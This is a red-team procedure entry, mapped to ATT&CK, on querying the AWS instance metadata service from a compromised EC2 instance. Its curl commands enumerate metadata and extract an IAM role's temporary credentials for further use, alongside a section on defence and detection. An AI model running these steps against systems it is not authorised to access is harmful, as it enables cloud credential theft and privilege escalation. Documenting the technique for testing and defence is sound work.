---
id: e2715a4a-5e83-4242-847c-6b3ce607da41
type: procedure
name: AWS-Metadata-Information-Retrieval
verified: true
submitted: false
created_at: '2023-04-06T03:56:13.321652+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Cloud Service Discovery|T1526 - Cloud Service Discovery]]'
  - '[[techniques/Execution through API|T1106 - Execution through API]]'
sub_techniques: []
tags:
  - '[[tags/AWS Metadata]]'
  - '[[tags/Cloud - AWS]]'
  - '[[tags/Discovery]]'
  - '[[tags/Cloud Discovery]]'
commands:
  - '[[commands/curl-list-aws-metadata-categories]]'
  - '[[commands/curl-get-aws-instance-id]]'
  - '[[commands/curl-get-aws-iam-role]]'
  - '[[commands/curl-get-aws-security-credentials]]'
platforms:
  - AWS
  - Linux
tools:
  - '[[tools/cURL]]'
validated: true
---

# AWS-Metadata-Information-Retrieval

## Summary

This procedure outlines how to query the AWS Instance Metadata Service (IMDS) from a compromised EC2 instance to retrieve configuration details, such as instance identity, network information, and attached IAM roles. This discovery technique helps attackers understand the environment, identify temporary credentials, and plan privilege escalation or lateral movement within the AWS cloud.

## Description

The AWS Instance Metadata Service is accessible at the link-local IP address 169.254.169.254 on EC2 instances and provides unauthenticated access to instance metadata. Attackers with shell access to an instance can use HTTP requests to this endpoint to enumerate sensitive details without additional privileges. This is particularly useful in cloud environments for mapping resources, extracting temporary security credentials from IAM roles, and facilitating further exploitation like assuming roles or accessing other services. The procedure assumes IMDSv1 is enabled; IMDSv2 requires a session token but follows similar querying patterns.

## Requirements

1. Shell access to a running AWS EC2 instance (e.g., via initial compromise or SSH).
2. Availability of an HTTP client like curl (standard on most Linux distributions).
3. The instance must be configured to allow metadata service access (default for EC2).
4. No elevated privileges required, but the instance's IAM role may expose credentials.

## Defense

Defensive measures and detection strategies:

- Enable IMDSv2 on instances to require hop-limit session tokens, preventing SSRF-based metadata access from external requests.
- Use least-privilege IAM roles and avoid attaching roles with broad permissions to instances.
- Monitor CloudTrail logs for unusual API calls (e.g., AssumeRole) and VPC Flow Logs for traffic to 169.254.169.254.
- Implement network segmentation and instance metadata service access controls via AWS security groups.
- Deploy endpoint protection that alerts on processes querying the metadata IP.

## Objectives

1. Enumerate available metadata categories to understand the instance's configuration.
2. Retrieve instance-specific details like ID and hostname for environment mapping.
3. Identify attached IAM roles and extract temporary security credentials for privilege escalation.
4. Gather information to enable access to other AWS services or resources.

## Instructions

### Step 1: List Available Metadata Categories

**Context**: Begin by querying the root metadata endpoint to discover what categories of information are available, such as instance identity, network, and IAM details. This step confirms access to the metadata service and provides a directory for further queries.

**Command** ([[commands/curl-list-aws-metadata-categories]]):
```bash
curl http://169.254.169.254/latest/meta-data/
```

> This command sends a GET request to the metadata service and lists endpoints like ami-id, instance-id, local-hostname, iam, and security-groups. If successful, it returns a plain-text list. If the service is inaccessible (e.g., due to IMDSv2 or network restrictions), it will fail with a connection error.

### Step 2: Retrieve Instance Identity Information

**Context**: Query specific endpoints for core instance details, starting with the instance ID and hostname. This helps attackers correlate the instance with AWS resources and understand the runtime environment.

**Command** ([[commands/curl-get-aws-instance-id]]):
```bash
curl http://169.254.169.254/latest/meta-data/instance-id
```

> The command fetches the unique instance ID (e.g., i-1234567890abcdef0). Use this to look up the instance in the AWS console or API if credentials are obtained later. Expected output is a single line with the ID.

**Command** ([[commands/curl-get-aws-local-hostname]]):
```bash
curl http://169.254.169.254/latest/meta-data/local-hostname
```

> This retrieves the instance's local hostname (e.g., ip-10-0-1-100.ec2.internal), aiding in internal network discovery.

### Step 3: Check for Attached IAM Roles

**Context**: Inspect the IAM section to determine if the instance has an attached role, which could provide temporary credentials for AWS API access. This is a key step for credential discovery.

**Command** ([[commands/curl-get-aws-iam-role]]):
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

> If an IAM role is attached, this returns the role name (e.g., MyInstanceRole). If no role is present, it returns a 404 error, indicating no credentials are available via metadata.

### Step 4: Extract IAM Security Credentials

**Context**: If a role is found, query for the temporary credentials (AccessKeyId, SecretAccessKey, Token). These can be used immediately for AWS API calls, enabling escalation to other resources.

**Command** ([[commands/curl-get-aws-security-credentials]]):
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

> Replace ROLE_NAME with the output from Step 3. The response is JSON containing AccessKeyId, SecretAccessKey, Token, and expiration time. These credentials are rotated periodically (e.g., every 6 hours). Verify by testing with AWS CLI: aws sts get-caller-identity.

> Decision point: If credentials are obtained, proceed to test them against AWS services. If expired or invalid, wait for rotation or seek alternative access.
